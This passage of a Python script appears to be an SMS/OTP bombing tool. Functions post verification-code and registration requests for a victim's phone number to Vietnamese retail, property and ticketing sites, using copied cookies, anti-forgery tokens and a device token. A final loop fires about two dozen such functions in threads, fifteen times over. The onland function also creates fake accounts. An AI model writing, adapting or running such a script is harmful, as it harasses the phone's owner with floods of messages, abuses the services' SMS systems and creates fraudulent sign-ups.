        # 'Cookie': "TBMCookie_3209819802479625248=149007001706792818ykwluJizbl6hqtxBuk2j7+TTGmg=; ___utmvm=###########; SvID=beline26122|ZbuXd|ZbuXd; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _gcl_au=1.1.1694229339.1706792827; __zi=2000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NH8rrmEspamLIdtgUvRhRJ52IUfddlDm2KvTuq-6prG5KcpKuCm.1; _pk_ref.7.8f7e=%5B%22%22%2C%22%22%2C1706792827%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.7.8f7e=8502183722ed63db.1706792827.; _pk_ses.7.8f7e=1; _fbp=fb.1.1706792827091.1555958278; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=7572%2C1.55.46.91%2C1%2C9c1ce27f08b16479d2e17743062b28ed; _tt_enable_cookie=1; _ttp=xTzgl2_thC9KikRmNlNVkCD5GqS; DMX_Personal=%7B%22UID%22%3A%2238899a2184e30162f4d47afe8354de1d703ec0af%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8F-U4Yzs1fpHnULPXrQpbBYMn5Y3dqOlUv2xTZLwHAxIsfO9kpGiAdwe8nh2Zc_dZ3WT80tuhJFb5RPHwofFugBmEn5kmFD1lWDkJIXpP3rfZepGpWf5HYN8bZ0ThmUNxtmEvOgjaj4KolB-QfyIHIQ; cebsp_=2; _ga=GA1.2.547655569.1706792827; _gid=GA1.2.1457629000.1706792828; _gat=1; _ga_TZK5WPYMMS=GS1.2.1706792828.1.0.1706792828.60.0.0; _ga_TLRZMSX5ME=GS1.1.1706792826.1.1.1706792828.58.0.0; _ce.s=v~9cd59df1fe3a740935a8d306b27aab199e5c284a~lcw~1706792837405~lva~1706792827256~vpv~0~v11.fhb~1706792827521~v11.lhb~1706792827521~v11.cs~127806~v11.s~cd66dd30-c102-11ee-98d4-5db2477a32f7~v11.sla~1706792837690~lcw~1706792837690",
        'Origin': 'https://www.thegioididong.com',
        'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': phone,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8F-U4Yzs1fpHnULPXrQpbBau1HSs7Kjo7zgm87sE1Opy0G4wEn5P93K3ozxIuHk72aP7QQGdlMJu74yUKpSMSmVowwfVGkgjYzYq5iX1huNu_eZeuq-727llFDuylGsCKsPGajqNTJPZSt8popqn5N0',
    }

    response = requests.post(
        'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )
def onland():
    cookies = {
        '_gcl_au': '1.1.2110499647.1706793177',
        '__zi': '2000.SSZzejyD5z0dY_oedHWSrs7TjUc5LXBF8u6duvj4KDqrawYzaqqOb3UUgBgHIn_QD9kgy9T45japbwRzCm.1',
    }

    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'undefined',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        # 'Cookie': '_gcl_au=1.1.2110499647.1706793177; __zi=2000.SSZzejyD5z0dY_oedHWSrs7TjUc5LXBF8u6duvj4KDqrawYzaqqOb3UUgBgHIn_QD9kgy9T45japbwRzCm.1',
        'Origin': 'https://onland.tech',
        'Referer': 'https://onland.tech/user/register.html',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone_number': phone,
        'password': 'Dang=2007',
        'fullname': 'Bùi Anh Thanh',
        'email': 'aaaaaaaaa@gmail.com',
        'province': '77',
        'broker': '',
    }

    response = requests.post('https://onland.tech/api/register', cookies=cookies, headers=headers, json=json_data)
def ticketbox():
    headers = {
        'authority': 'api-movie.ticketbox.vn',
        'accept': '*/*',
        'accept-language': 'en',
        'content-type': 'application/json',
        'origin': 'https://ticketbox.vn',
        'referer': 'https://ticketbox.vn/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-tb-access-token': '',
        'x-tb-device-token': 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhcGkudGlja2V0Ym94LnZuIiwiZXhwIjoxNzA5Mzg1ODQ4LCJpYXQiOjE3MDY3OTM4NDgsImlzcyI6ImlkZW50aXR5LnRpY2tldGJveC52biIsImRldmljZV9pZCI6Ijc1NDZiOGQ2MTZlZmZiMGRkYzM4ZDkwMjZjNDBiODdjIiwia2luZCI6ImRldmljZV90b2tlbiJ9.OixOgmL5bam8rPSTod85ScuPnHOweHFVq-bs9-YDGAJjExQFbxyOADysQZF7tZqQiL-2-4SAVAQFIfRDw-n6Ol505YubLfu-TSQ9huaslwLifinr3s5CpBeiCyLaM9sQk1oNQiXvGQ48YWzeqM2-PiSoXfa_bnBiiIThpHHBSQyjKqz6QJaWMx6boN8W4iYGyh0pVCu_5Gtu0YgWU6p6H7fFB8O3YWF93qAa9100gGLIfZ4s3FWBICN1wo_YLkPqV1s-dvv0OgLaloVL9qH5NDAEwdsq596AmnQbNdEMY8Q7Ko-nEMfW0FJ_BpvHtTxE6hKTTwOsRLDbCo2SnOXV7g',
    }

    json_data = {
        'phone': '+84'+phone[1:10],
    }

    response = requests.post('https://api-movie.ticketbox.vn/v1/users/otps/send', headers=headers, json=json_data)
for i in range(15):      
    threading.submit(myvietel)
    threading.submit(fptshop)
    threading.submit(tv360)
    threading.submit(mocha)
    time.sleep(1)
    threading.submit(ghn)
    threading.submit(call5)
    threading.submit(vieon)
    time.sleep(1)
    threading.submit(longchau)
    threading.submit(dmx)
    threading.submit(vieon1)
    time.sleep(1)
    threading.submit(kingfood)        
    threading.submit(inc)
    threading.submit(galaxy)
    time.sleep(1)
    threading.submit(lotte)
    threading.submit(fahasa)
    threading.submit(ankhang)
    time.sleep(1)
    threading.submit(phuclong)
    threading.submit(winmart_zalo)
    time.sleep(1)
    threading.submit(tgdd)
    threading.submit(onland)
    threading.submit(ticketbox)